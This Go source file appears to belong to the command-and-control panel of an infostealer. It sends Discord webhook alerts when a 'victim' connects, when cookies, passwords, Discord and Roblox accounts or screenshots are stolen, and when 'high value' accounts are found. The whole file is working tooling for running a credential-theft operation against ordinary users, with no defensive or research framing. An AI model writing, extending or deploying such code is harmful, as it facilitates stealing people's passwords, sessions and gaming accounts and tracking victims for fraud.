package services

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

// DiscordBot handles Discord webhook notifications and bot commands
type DiscordBot struct {
	WebhookURL string
	Token      string
	Enabled    bool
}

// DiscordEmbed represents a Discord rich embed
type DiscordEmbed struct {
	Title       string                   `json:"title,omitempty"`
	Description string                   `json:"description,omitempty"`
	URL         string                   `json:"url,omitempty"`
	Color       int                      `json:"color,omitempty"`
	Timestamp   string                   `json:"timestamp,omitempty"`
	Footer      *DiscordEmbedFooter      `json:"footer,omitempty"`
	Author      *DiscordEmbedAuthor      `json:"author,omitempty"`
	Fields      []DiscordEmbedField      `json:"fields,omitempty"`
	Thumbnail   *DiscordEmbedThumbnail   `json:"thumbnail,omitempty"`
	Image       *DiscordEmbedImage       `json:"image,omitempty"`
}

type DiscordEmbedFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

type DiscordEmbedAuthor struct {
	Name    string `json:"name"`
	URL     string `json:"url,omitempty"`
	IconURL string `json:"icon_url,omitempty"`
}

type DiscordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type DiscordEmbedThumbnail struct {
	URL string `json:"url"`
}

type DiscordEmbedImage struct {
	URL string `json:"url"`
}

// DiscordWebhookPayload is the main webhook message structure
type DiscordWebhookPayload struct {
	Content   string          `json:"content,omitempty"`
	Username  string          `json:"username,omitempty"`
	AvatarURL string          `json:"avatar_url,omitempty"`
	Embeds    []DiscordEmbed  `json:"embeds,omitempty"`
}

// NewDiscordBot creates a new Discord bot instance
func NewDiscordBot() *DiscordBot {
	webhookURL := os.Getenv("DISCORD_WEBHOOK_URL")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	
	if webhookURL == "" {
		log.Println("[Discord] No webhook URL configured (DISCORD_WEBHOOK_URL)")
	}
	
	return &DiscordBot{
		WebhookURL: webhookURL,
		Token:      token,
		Enabled:    webhookURL != "",
	}
}

// SendWebhook sends a message to Discord webhook
func (d *DiscordBot) SendWebhook(payload DiscordWebhookPayload) error {
	if !d.Enabled {
		return fmt.Errorf("discord webhook not configured")
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}
	
	resp, err := http.Post(d.WebhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send webhook: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("webhook returned status %d: %s", resp.StatusCode, string(body))
	}
	
	return nil
}

// NotifyVictimConnected sends notification when a victim connects
func (d *DiscordBot) NotifyVictimConnected(victimID string, info map[string]string) error {
	if !d.Enabled {
		return nil
	}
	
	hostname := info["hostname"]
	if hostname == "" {
		hostname = "Unknown"
	}
	
	username := info["username"]
	if username == "" {
		username = "Unknown"
	}
	
	embed := DiscordEmbed{
		Title:       "🟢 New Victim Connected",
		Description: fmt.Sprintf("A new victim has connected to the C2 server."),
		Color:       0x00FF00, // Green
		Timestamp:   time.Now().Format(time.RFC3339),
		Fields: []DiscordEmbedField{
			{Name: "🖥️ Victim ID", Value: victimID, Inline: true},
			{Name: "👤 Username", Value: username, Inline: true},
			{Name: "🏠 Hostname", Value: hostname, Inline: true},
			{Name: "💻 OS", Value: info["os"], Inline: true},
			{Name: "🔐 Admin", Value: info["admin"], Inline: true},
			{Name: "🌐 IP", Value: info["ip"], Inline: true},
		},
		Footer: &DiscordEmbedFooter{
			Text: "C2 Control Panel",
		},
	}
	
	return d.SendWebhook(DiscordWebhookPayload{
		Username:  "C2 Bot",
		AvatarURL: "https://cdn-icons-png.flaticon.com/512/3094/3094820.png",
		Embeds:    []DiscordEmbed{embed},
	})
}

// NotifyVictimDisconnected sends notification when victim disconnects
func (d *DiscordBot) NotifyVictimDisconnected(victimID string) error {
	if !d.Enabled {
		return nil
	}
	
	embed := DiscordEmbed{
		Title:       "🔴 Victim Disconnected",
		Description: fmt.Sprintf("Victim `%s` has disconnected.", victimID),
		Color:       0xFF0000, // Red
		Timestamp:   time.Now().Format(time.RFC3339),
		Footer: &DiscordEmbedFooter{
			Text: "C2 Control Panel",
		},
	}
	
	return d.SendWebhook(DiscordWebhookPayload{
		Username:  "C2 Bot",
		AvatarURL: "https://cdn-icons-png.flaticon.com/512/3094/3094820.png",
		Embeds:    []DiscordEmbed{embed},
	})
}

// NotifyDataStolen sends notification when data is stolen
func (d *DiscordBot) NotifyDataStolen(victimID string, dataType string, count int) error {
	if !d.Enabled {
		return nil
	}
	
	var emoji string
	var color int
	
	switch dataType {
	case "cookies":
		emoji = "🍪"
		color = 0xFFAA00
	case "passwords":
		emoji = "🔑"
		color = 0xFF5500
	case "discord":
		emoji = "💬"
		color = 0x5865F2
	case "roblox":
		emoji = "🎮"
		color = 0xE10000
	case "screenshot":
		emoji = "📸"
		color = 0x00AAFF
	default:
		emoji = "📦"
		color = 0x888888
	}
	
	embed := DiscordEmbed{
		Title:       fmt.Sprintf("%s Data Stolen: %s", emoji, dataType),
		Description: fmt.Sprintf("Extracted `%d` %s from victim `%s`", count, dataType, victimID),
		Color:       color,
		Timestamp:   time.Now().Format(time.RFC3339),
		Footer: &DiscordEmbedFooter{
			Text: "C2 Control Panel",
		},
	}
	
	return d.SendWebhook(DiscordWebhookPayload{
		Username:  "C2 Bot",
		AvatarURL: "https://cdn-icons-png.flaticon.com/512/3094/3094820.png",
		Embeds:    []DiscordEmbed{embed},
	})
}

// NotifyScreenshot sends screenshot notification with image
func (d *DiscordBot) NotifyScreenshot(victimID string, imageName string, imageURL string) error {
	if !d.Enabled {
		return nil
	}
	
	embed := DiscordEmbed{
		Title:       "📸 Screenshot Captured",
		Description: fmt.Sprintf("Screenshot from victim `%s`", victimID),
		Color:       0x00AAFF,
		Timestamp:   time.Now().Format(time.RFC3339),
		Image: &DiscordEmbedImage{
			URL: imageURL,
		},
		Footer: &DiscordEmbedFooter{
			Text: "C2 Control Panel",
		},
	}
	
	return d.SendWebhook(DiscordWebhookPayload{
		Username:  "C2 Bot",
		AvatarURL: "https://cdn-icons-png.flaticon.com/512/3094/3094820.png",
		Embeds:    []DiscordEmbed{embed},
	})
}

// NotifyHighValueData sends notification for high-value data (Discord nitro, Roblox with robux, etc.)
func (d *DiscordBot) NotifyHighValueData(victimID string, dataType string, details string) error {
	if !d.Enabled {
		return nil
	}
	
	embed := DiscordEmbed{
		Title:       "💎 High-Value Data Detected!",
		Description: fmt.Sprintf("**%s detected**\n\n%s", dataType, details),
		Color:       0xFFD700, // Gold
		Timestamp:   time.Now().Format(time.RFC3339),
		Fields: []DiscordEmbedField{
			{Name: "🖥️ Victim ID", Value: victimID, Inline: false},
		},
		Footer: &DiscordEmbedFooter{
			Text: "C2 Control Panel",
		},
	}
	
	return d.SendWebhook(DiscordWebhookPayload{
		Content:   "@everyone 🚨 **HIGH VALUE TARGET DETECTED** 🚨",
		Username:  "C2 Bot",
		AvatarURL: "https://cdn-icons-png.flaticon.com/512/3094/3094820.png",
		Embeds:    []DiscordEmbed{embed},
	})
}
